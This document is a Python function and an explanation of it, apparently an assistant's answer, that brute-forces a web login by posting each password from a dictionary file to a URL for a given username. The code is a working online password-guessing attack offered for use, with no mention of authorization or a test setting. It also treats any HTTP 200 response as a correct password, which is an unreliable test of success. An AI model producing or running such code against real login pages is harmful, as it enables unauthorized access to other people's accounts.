```python
import requests
from itertools import product
from colored_html_output import colored_html_output

def brute_force_http_password(url, username, password_dictionary):
    passwords = []
    with open(password_dictionary, 'r') as file:
        for line in file:
            passwords.append(line.strip())
    
    for password in passwords:
        response = requests.post(url, data={'username': username, 'password': password})
        if response.status_code == 200:
            colored_html_output(f"Password found: {password}", "green")
            return password
    
    colored_html_output("Password not found", "red")
    return None
```

This code defines a function `brute_force_http_password` that takes in a URL, a username, and a password dictionary file. It reads the passwords from the dictionary file and iterates through each password, sending a POST request to the specified URL with the username and password as data. If a response with a status code of 200 is received, it means the password is correct and it is displayed in green using the `colored_html_output` function from the `colored_html_output.py` module. If no correct password is found, a message is displayed in red. The function returns the found password or `None` if no password is found.
